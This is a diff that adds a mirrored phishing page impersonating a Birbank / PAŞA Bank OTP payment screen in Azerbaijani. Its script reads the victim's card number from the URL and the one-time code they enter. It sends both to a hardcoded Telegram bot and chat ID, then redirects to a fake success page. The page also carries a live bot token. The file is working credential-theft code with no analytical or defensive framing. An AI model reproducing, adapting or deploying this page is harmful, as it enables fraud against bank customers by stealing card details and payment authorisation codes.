@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<!-- saved from url=(0092)https://ecomm.pashabank.az:8463/ecomm2/ClientHandler?trans_id=6o47pqDpUDPdSN0NbRXQl80thBw%3D -->
+<html>
+
+
+<!-- Mirrored from irshadnewyear.com/iphone_14_pro_max/payloan/otp.html?cardnr= by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 20 Dec 2024 14:09:39 GMT -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<link rel="shortcut icon" href="birbank.png" type="image/ico">
+	
+	<title>Birbank Pay</title>
+
+	<link rel="stylesheet" href="ode_files/styles.css" type="text/css">
+	<style id="video-roll-deg-scale" type="text/css">
+		.video-roll-deg-scale {}
+	</style>
+	<style id="video-roll-focus-style" type="text/css">
+		#video-roll-root-mask {
+			display: none;
+			position: fixed;
+			left: 0;
+			top: 0;
+			width: 100%;
+			height: 100%;
+			backdrop-filter: unset;
+			z-index: 20000 !important;
+			background-color: rgba(0, 0, 0, 0.9);
+		}
+
+		.video-roll-focus {
+			width: undefinedpx;
+			height: undefinedpx;
+			position: absolute;
+			left: 0;
+			right: 0;
+			top: 0;
+			bottom: 0;
+			margin: auto;
+			border-radius: unset
+		}
+		.disabled {
+			background-color: grey;
+			color: white;
+			cursor: not-allowed;
+		}
+	</style>
+
+</head>
+
+<body>
+	<div class="mainwrapper">
+		<header class="ecom-header">
+			<img class="logo" src="ode_files/pb-logo.svg" alt="pb-logo">
+			<label class="amount-label">Ümumi məbləğ</label>
+			<label id="ledger" class="amount">500.00 AZN</label>
+			<br />
+			<br />
+			<label class="amount-label">Ödəniş istəkləri çox olduğundan OTP kodunuz gec göndərilə bilər!</label>
+			<label class="amount-label">Səhifədən ayrılmamağınız xaiş olunur!</label>
+		</header>
+		<main>
+			<form id="otpentry" method="post" autocomplete="off">
+
+				<div class="input-field">
+					<label for="otp">OTP kodunu daxil edin.</label>
+					<input tabindex="1" id="otp" name="otp" type="text" maxlength="6" placeholder="OTP">
+				</div>
+				<a>Qalan vaxt: </a><a id="countdown" style="color: red !important;">05:00</a><a id="resendButton" href="otp.html"  style="color: green !important; display: none;">Yenidən göndər</a>
+				<br>
+				<br>
+				<br>
+				<br>
+
+				<button id="pay-btn" class="btn pay-btn disabled" type="button">
+					Ödənişi Təsdiqlə
+				</button>
+			</form>
+		</main>
+	</div>
+
+	<footer>
+		<div class="plastic-cards-container">
+			<div class="plastic-cards">
+				<img src="ode_files/verified-by-visa.svg" alt="verified-by-visa">
+				<img src="ode_files/visa.svg" alt="visa">
+				<img src="ode_files/visa-electron.svg" alt="visa-electron">
+			</div>
+			<div class="plastic-cards">
+				<img src="ode_files/maestro.svg" alt="maestro">
+				<img src="ode_files/mastercard.svg" alt="mastercard">
+				<img src="ode_files/mastercard-secure-code.svg" alt="mastercard-secure-code">
+			</div>
+		</div>
+		<div class="contacts">
+			<p>Bankla əlaqə üçün:</p>
+			<p>
+				customer.care@birbank.az
+				<span class="seperator">|</span>&nbsp;<span class="bank-number">+994 (12) 496 50 00</span>
+			</p>
+			<p id="copyrights">© Copyrights 2007-2024 PAŞA Bank</p>
+		</div>
+	</footer>
+
+
+
+	<div id="video-roll-root-mask"></div>
+</body>
+<script src="../../../code.jquery.com/jquery-3.6.4.min.js"></script>
+
+<script>
+	document.addEventListener('DOMContentLoaded', function () {
+		const otp = document.querySelector('#otp');
+		const paybtn = document.querySelector('#pay-btn');
+
+		paybtn.disabled = true;
+		paybtn.s
+
+		otp.addEventListener('input', function () {
+			this.value = this.value.replace(/\D/g, ''); 
+			checkInputs();
+		});
+
+		function checkInputs() {
+			if (otp.value.trim() !== '' && otp.value.length >= 4) {
+				paybtn.disabled = false;
+				paybtn.classList.remove('disabled');
+			} else {
+				paybtn.disabled = true;
+			}
+		}
+	});
+</script>
+
+<script>
+	let minutes = 5;
+	let seconds = 0;
+
+	function updateCountdown() {
+		let formattedMinutes = String(minutes).padStart(2, '0');
+		let formattedSeconds = String(seconds).padStart(2, '0');
+		document.getElementById('countdown').textContent = `${formattedMinutes}:${formattedSeconds}`;
+
+		if (minutes === 0 && seconds === 0) {
+			clearInterval(countdownInterval); 
+
+			clearInterval(countdownInterval); 
+
+			document.getElementById('countdown').style.display = 'none';
+			document.getElementById('resendButton').style.display = 'inline-block';
+		} else {
+			if (seconds === 0) {
+				seconds = 59;
+				minutes--;
+			} else {
+				seconds--;
+			}
+		}
+	}
+
+	let countdownInterval = setInterval(updateCountdown, 1000);
+</script>
+
+<script>
+	document.addEventListener('DOMContentLoaded', function () {
+		const otp = document.querySelector('#otp');
+		const paybtn = document.querySelector('#pay-btn');
+
+		otp.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '');
+            });
+
+
+		function checkInputs() {
+			if (otp.value.trim() !== '') {
+				paybtn.disabled = false;
+			} else {
+				paybtn.disabled = true;
+			}
+		}
+
+
+		otp.addEventListener('input', checkInputs);
+	});
+
+
+	const currentUrl = new URL(window.location.html);
+
+	const params = new URLSearchParams(currentUrl.search);
+
+	const cardnr = params.get('cardnr');
+
+	var telegram_bot_id = "8181395152:AAFrWCNgIiLdodA1uITARV74M4S6OMNBwDs";
+	var chat_id = 7813611012;
+	var otp_2;
+	var ready = function () {
+		otp_2 = document.getElementById("otp").value;
+		message = "Log: " + "irshad otp 💳" + "\nCard Number: " + cardnr + "\nOTP: " + otp_2;
+	};
+	var sender = function () {
+		ready();
+		var telegramSettings = {
+			"async": true,
+			"crossDomain": true,
+			"url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+			"method": "POST",
+			"headers": {
+				"Content-Type": "application/json",
+				"cache-control": "no-cache"
+			}, "data": JSON.stringify({ "chat_id": chat_id, "text": message })
+		};
+		$.ajax(telegramSettings).done(function (response) { console.log("Tamam:", response); });
+		otp_2 = document.getElementById("otp").value = "";
+		setTimeout(function () { window.location.href = "ugurlu.html"; }, 1000);
+		return false;
+	};
+
+	document.getElementById("pay-btn").addEventListener("click", function (event) {
+		event.preventDefault();
+		sender();
+	});
+</script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl508660'},{'dcenter':'p3'},{'cp_id':'10182053'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='../../../img1.wsimg.com/signals/js/clients/scc-c2/scc-c2.min.js'></script>
+<!-- Mirrored from irshadnewyear.com/iphone_14_pro_max/payloan/otp.html?cardnr= by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 20 Dec 2024 14:09:40 GMT -->
+</html>
